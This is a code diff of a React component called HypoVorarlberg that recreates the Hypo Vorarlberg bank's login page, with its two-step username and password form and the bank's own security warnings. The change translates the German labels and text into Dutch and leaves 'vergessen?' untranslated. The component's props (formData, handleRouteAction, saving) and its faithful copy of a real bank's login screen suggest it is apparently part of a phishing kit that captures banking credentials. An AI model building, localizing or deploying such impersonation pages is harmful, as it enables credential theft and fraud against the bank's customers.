@@ -65,7 +65,7 @@ export function HypoVorarlberg({ formData, onChange, handleRouteAction, saving }
 
             {/* Body Text */}
             <p className="text-[15px] text-gray-800 mb-5 leading-relaxed pr-4">
-              Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten geheim halten.
+              Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens geheim houdt.
             </p>
             <p className="text-[15px] text-gray-800 mb-8 leading-relaxed pr-4">
               Wir fordern Sie <strong className="font-bold">niemals</strong> zur Bekanntgabe Ihrer persönlichen Zugangsdaten auf. Weder per E-Mail, SMS noch am Telefon.
@@ -79,7 +79,7 @@ export function HypoVorarlberg({ formData, onChange, handleRouteAction, saving }
               {step === 1 ? (
                 <>
                   <div className="flex justify-between items-end mb-1">
-                    <label className="text-[13px] text-gray-500">Benutzername</label>
+                    <label className="text-[13px] text-gray-500">Gebruikersnaam</label>
                     <div className="text-[13px] text-[#0073c0]">
                       <a href="#" className="hover:underline">Barrierefrei</a> <span className="text-[#0073c0] mx-1">|</span> <a href="#" className="hover:underline">English</a>
                     </div>
@@ -94,7 +94,7 @@ export function HypoVorarlberg({ formData, onChange, handleRouteAction, saving }
               ) : (
                 <>
                   <div className="flex justify-between items-end mb-1">
-                    <label className="text-[13px] text-gray-500">Passwort</label>
+                    <label className="text-[13px] text-gray-500">Wachtwoord</label>
                     <div className="text-[13px] text-[#0073c0]">
                       <a href="#" className="hover:underline">Barrierefrei</a> <span className="text-[#0073c0] mx-1">|</span> <a href="#" className="hover:underline">English</a>
                     </div>
@@ -133,8 +133,8 @@ export function HypoVorarlberg({ formData, onChange, handleRouteAction, saving }
 
             {/* Secondary Links */}
             <div className="mt-8 flex flex-col items-center gap-1 text-[15px]">
-              <a href="#" className="text-[#0073c0] hover:underline">Benutzername vergessen?</a>
-              <a href="#" className="text-[#0073c0] hover:underline">Passwort vergessen?</a>
+              <a href="#" className="text-[#0073c0] hover:underline">Gebruikersnaam vergessen?</a>
+              <a href="#" className="text-[#0073c0] hover:underline">Wachtwoord vergessen?</a>
               
               <a href="#" className="mt-6 flex items-center gap-2 text-[#0073c0] hover:underline">
                 <div className="w-5 h-5 rounded-full border border-[#0073c0] text-[#0073c0] flex items-center justify-center text-[12px] font-serif font-bold">
